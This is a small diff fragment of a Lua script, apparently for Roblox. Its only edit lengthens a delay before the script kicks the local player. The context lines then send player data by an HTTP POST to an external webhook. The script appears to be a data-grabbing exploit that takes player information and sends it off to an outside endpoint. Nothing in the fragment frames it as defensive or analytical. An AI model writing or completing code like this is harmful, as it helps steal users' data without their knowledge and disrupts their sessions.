@@ -41,6 +41,6 @@ local player = game.Players.LocalPlayer
 local function kickPlayer()
     player:Kick()
 end
-wait(10)
+wait(20)
 kickPlayer()
 HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
